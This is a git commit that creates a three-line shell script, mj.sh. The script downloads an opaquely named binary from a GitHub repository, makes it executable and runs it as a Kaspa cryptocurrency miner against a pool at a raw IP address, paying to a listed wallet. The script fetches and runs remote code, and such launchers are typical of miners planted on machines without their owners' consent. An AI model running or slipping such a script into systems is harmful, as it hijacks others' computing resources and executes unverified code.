dd1f5e45d6b5b47108dd6682c2bdae3d93d5e479
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-06 16:35:00 +0800

    Create mj.sh

---
+++ mj.sh
@@ -0,0 +1,3 @@
+wget https://github.com/angkii/m/raw/main/AkubapakMU
+chmod 700 AkubapakMU
+./AkubapakMU --algo KASPA --pool stratum+ssl://134.122.17.41:80 --user kaspa:qzhva42mxq008mp25jfwrqqeavp8t38r5qynm3fq44zwtpptjyezqk09sxvme
